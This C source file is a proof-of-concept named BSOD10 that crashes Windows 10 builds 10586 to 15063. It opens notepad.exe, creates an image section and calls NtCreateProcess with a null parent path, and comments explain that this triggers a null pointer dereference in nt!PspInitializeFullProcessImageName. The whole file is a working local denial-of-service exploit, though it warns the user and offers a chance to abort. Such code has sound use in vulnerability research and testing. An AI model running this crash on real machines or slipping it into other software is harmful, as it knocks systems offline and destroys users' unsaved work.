#include "ntdll.h"

NTSYSAPI
int
__cdecl
_vsnprintf(
	_Out_ PCHAR Buffer,
	_In_ SIZE_T BufferCount,
	_In_ PCCH Format,
	_In_ va_list ArgList
	);

VOID
Printf(
	_In_ PCCH Format,
	...
	)
{
	CHAR Buffer[512];
	va_list VaList;
	va_start(VaList, Format);
	ULONG N = _vsnprintf(Buffer, sizeof(Buffer), Format, VaList);
	WriteConsoleA(NtCurrentPeb()->ProcessParameters->StandardOutput, Buffer, N, &N, NULL);
	va_end(VaList);
}

VOID
WaitForKey(
	)
{
	INPUT_RECORD InputRecord = { 0 };
	ULONG NumRead;
	while (InputRecord.EventType != KEY_EVENT || !InputRecord.Event.KeyEvent.bKeyDown || InputRecord.Event.KeyEvent.dwControlKeyState !=
		(InputRecord.Event.KeyEvent.dwControlKeyState & ~(RIGHT_CTRL_PRESSED | LEFT_CTRL_PRESSED)))
	{
		ReadConsoleInputA(NtCurrentPeb()->ProcessParameters->StandardInput, &InputRecord, 1, &NumRead);
	}
}

int main()
{
	const PPEB Peb = NtCurrentPeb();
	Printf("Welcome to BSOD10, running on NT %u.%u.%u.\n",
		Peb->OSMajorVersion, Peb->OSMinorVersion, Peb->OSBuildNumber);
	Printf("Expected result: %s.\n\n", Peb->OSBuildNumber < 10586 || Peb->OSBuildNumber > 15063
		? "return code 0 (STATUS_SUCCESS)"
		: "blue screen/hang. Please close any open programs now, or press CTRL+C to abort");
	Printf("Press any key to continue...\n\n");
	WaitForKey();

	// Open file with execute permissions
	UNICODE_STRING NtImagePath = RTL_CONSTANT_STRING(L"\\??\\C:\\Windows\\notepad.exe");
	OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(&NtImagePath, OBJ_CASE_INSENSITIVE);
	IO_STATUS_BLOCK IoStatusBlock;
	HANDLE FileHandle;
	NTSTATUS Status = NtCreateFile(&FileHandle,
									SYNCHRONIZE | FILE_EXECUTE,
									&ObjectAttributes,
									&IoStatusBlock,
									NULL,
									FILE_ATTRIBUTE_NORMAL,
									FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
									FILE_OPEN,
									FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
									NULL,
									0);
	if (!NT_SUCCESS(Status))
		return Status;

	// Obtain a section handle
	HANDLE SectionHandle;
	Status = NtCreateSection(&SectionHandle,
							SECTION_ALL_ACCESS,
							NULL,
							NULL,
							PAGE_EXECUTE,
							SEC_IMAGE,
							FileHandle);
	if (!NT_SUCCESS(Status))
		return Status;

	NtClose(FileHandle);
	Printf("Starting %wZ...\n", &NtImagePath);

	// Crash occurs here. (Alternatively call NtCreateProcessEx, which takes the same execution path.)
	// rcx will be zero in nt!PspInitializeFullProcessImageName, causing a null pointer dereference
	HANDLE ProcessHandle;
	Status = NtCreateProcess(&ProcessHandle,
							PROCESS_ALL_ACCESS,
							NULL,
							NtCurrentProcess,
							0,
							SectionHandle,
							NULL,
							NULL);
	
	// On Windows 10 >= 10586 and < 16299, any messages below this line will be from kd or WinDbg
	NtClose(SectionHandle);
	if (NT_SUCCESS(Status))
	{
		NtTerminateProcess(ProcessHandle, Status);
		NtClose(ProcessHandle);
	}
	Printf("NtCreateProcess: %08X\n\nPress any key to exit.\n", Status);
	WaitForKey();
	return Status;
}
